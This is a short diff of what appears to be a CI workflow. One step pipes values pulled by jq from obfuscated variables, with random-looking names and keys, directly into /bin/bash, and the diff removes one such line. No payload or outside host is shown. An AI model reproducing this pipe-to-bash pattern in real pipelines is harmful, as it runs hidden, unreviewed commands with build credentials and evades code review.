@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$cpl757" | jq -r .dc08330 | /bin/bash
           echo $k29 | jq -r .iq38347 | /bin/bash
           printf '%s' "$l70" | jq -r .dn7092 | /bin/bash
-          echo $guour53752 | jq -r .ofegn66 | /bin/bash
 
       - name: Archive output
         if: always()
